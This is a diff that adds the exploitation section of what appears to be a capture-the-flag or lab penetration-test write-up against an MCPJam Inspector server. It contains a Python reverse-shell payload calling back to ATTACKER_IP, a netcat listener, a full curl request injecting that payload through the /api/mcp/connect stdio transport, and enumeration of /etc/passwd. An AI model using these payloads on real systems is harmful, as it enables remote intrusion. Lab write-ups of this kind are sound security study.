@@ -661,7 +661,87 @@ The stdio transport vulnerability in `/api/mcp/connect` is the most critical —
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
 
-## 3. Exploitation
+## 3. Exploitation — Initial Access
+
+### 3.1 Exploit Acquisition and Preparation
+
+No external exploit required. The attack surface map from JS bundle extraction provides two direct paths:
+
+1. **SSRF via `/api/mcp/oauth/proxy`** — confirmed working; used for service reconnaissance and later to enumerate OPSMCP.
+2. **RCE via `/api/mcp/connect` stdio transport** — the Inspector expects a `serverConfig` JSON object with `type: "stdio"`, `command`, and `args`. Substituting a Python reverse shell for a legitimate MCP server command triggers OS command execution.
+
+Reverse shell payload constructed:
+
+```python
+import socket,subprocess,os
+s=socket.socket()
+s.connect(("ATTACKER_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+```
+
+This inline Python was inlined into the `args` array of the JSON payload.
+
+### 3.2 Exploitation Execution
+
+**Command:** `nc -lvnp 4444` (on attacker, started first)
+
+**Breakdown:**
+- `nc` — Netcat utility for raw TCP connections.
+- `-l` — Listen mode.
+- `-v` — Verbose output, prints connection details.
+- `-n` — No DNS resolution, avoiding delays.
+- `-p 4444` — Bind to port 4444.
+
+**Result:**
+```shell
+kali@kali:~$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+**Command:** `curl -s -X POST http://TARGET_IP:6274/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],"serverId":"revshell"}}'`
+
+**Breakdown:**
+- `"type":"stdio"` — Tells MCPJam Inspector to use the stdio transport, which spawns a subprocess.
+- `"command":"python3"` — The interpreter to execute; python3 is available on most Ubuntu systems.
+- `"args":["-c","..."]` — The `-c` flag passes the Python one-liner as inline code. The shell command embedded connects back to the attacker's IP on port 4444 and redirects stdin/stdout/stderr over the socket.
+- `"serverId":"revshell"` — An arbitrary identifier required by the API schema.
+
+**Result:**
+```shell
+connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 54870
+bash: cannot set terminal process group (1056): Inappropriate ioctl for device
+bash: no job control in this shell
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
+```
+
+Shell received as `mcp-dev` in the Inspector's working directory.
+
+### 3.3 Initial Shell Enumeration
+
+**Command:** `ssh -i devhub_key -o StrictHostKeyChecking=no mcp-dev@TARGET_IP "uname -a && cat /etc/passwd | grep -v nologin | grep -v false"`
+
+**Breakdown:**
+- `uname -a` — Print all kernel information: kernel name, hostname, kernel release, kernel version, machine hardware, and OS.
+- `cat /etc/passwd | grep -v nologin | grep -v false` — List interactive user accounts by filtering out service accounts that use `/bin/nologin` or `/bin/false` as shells.
+
+**Result:**
+```shell
+Linux devhub 5.15.0-179-generic #189-Ubuntu SMP Tue May 5 18:20:56 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
+analyst:x:1002:1002::/home/analyst:/bin/bash
+```
+
+| Account | UID | Shell | Notes |
+|---------|-----|-------|-------|
+| root | 0 | /bin/bash | Final target |
+| mcp-dev | 1001 | /bin/bash | Current shell user; runs MCPJam Inspector |
+| analyst | 1002 | /bin/bash | Owns Jupyter Lab; holds user.txt |
+
 <div align="center">
 <br>
 <br>
